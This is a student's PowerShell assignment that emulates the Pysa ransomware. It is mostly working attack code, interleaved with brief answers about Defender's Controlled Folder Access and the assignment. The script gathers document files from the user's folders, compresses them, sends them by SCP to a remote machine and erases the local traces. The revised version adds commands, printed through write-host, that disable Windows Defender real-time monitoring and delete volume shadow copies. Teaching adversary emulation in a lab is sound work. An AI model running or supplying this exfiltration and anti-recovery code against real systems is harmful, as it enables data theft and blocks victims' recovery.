<#
Get-ChildItem -Recurse -Include *.docx,*.pdf,*.txt,*.xlsx -Path .\Documents | Export-Csv `
-Path .\files.csv

# Import the csv file.
$fileList = Import-Csv .\files.csv -Header FullName

mkdir .\Secret_Documents\ 

# Loop through the results
foreach ($f in $fileList) {
    # Copy files to Secret_Documents
    Copy-Item $f.FullName -Destination .\Secret_Documents
}

# Compress Secret_Documents into Documents.zip
Compress-Archive -Path .\Secret_Documents -DestinationPath .\Documents.zip

# Copy Documents.zip to remote machine
Set-SCPItem -ComputerName '192.168.6.71' -Credential (Get-Credential paul.gleason) -Port '2222' `
-Destination '/home/paul.gleason' -Path './Documents.zip'

Remove-Item .\Secret_Documents -Force -Recurse
Remove-Item .\Documents.zip
Remove-Item .\files.csv

# Disable Real time Monitoring for Windows Defender
write-host 'Set-MpPreference -DisableRealtimeMonitoring $true'

<#
What is Defender Controlled Folder Access?
    Blocks unauthorzied appliations from accessing or changing files in protected folders.
What behavior of Pysa would cause Controlled Folder Access to trigger? 
    It would trigger Controlled Folder Access when Pysa starts encrypting files.
#>

# delete volume shadow copies and restore points
# write-host 'vssadmin delete shadows /all'
#>

<#
Based on your existing code base of emulating the Pysa ransomware, 
add the cmdlets above where you believe those should go in the 
execution order of your malware.

1) Disable Real time protection
2) Delete shadows
3) Run malware / copy files
#>


# Disable Real time Monitoring for Windows Defender
write-host Set-MpPreference -DisableRealtimeMonitoring $true

# delete volume shadow copies and restore points
write-host vssadmin delete shadows /all

Get-ChildItem -Recurse -Include *.docx,*.pdf,*.txt,*.xlsx -Path .\Documents | Export-Csv `
-Path .\files.csv

# Import the csv file.
$fileList = Import-Csv .\files.csv -Header FullName

mkdir .\Secret_Documents\ 

# Loop through the results
foreach ($f in $fileList) {
    # Copy files to Secret_Documents
    Copy-Item $f.FullName -Destination .\Secret_Documents
}

# Compress Secret_Documents into Documents.zip
Compress-Archive -Path .\Secret_Documents -DestinationPath .\Documents.zip

# Copy Documents.zip to remote machine
Set-SCPItem -ComputerName '192.168.6.71' -Credential (Get-Credential paul.gleason) -Port '2222' `
-Destination '/home/paul.gleason' -Path './Documents.zip'

Remove-Item .\Secret_Documents -Force -Recurse
Remove-Item .\Documents.zip
Remove-Item .\files.csv

<#
What did you like the most and least about this assignment?
    I really liked learning more about being able to control more of the host machine
What additional questions do you have?
    N/A
#>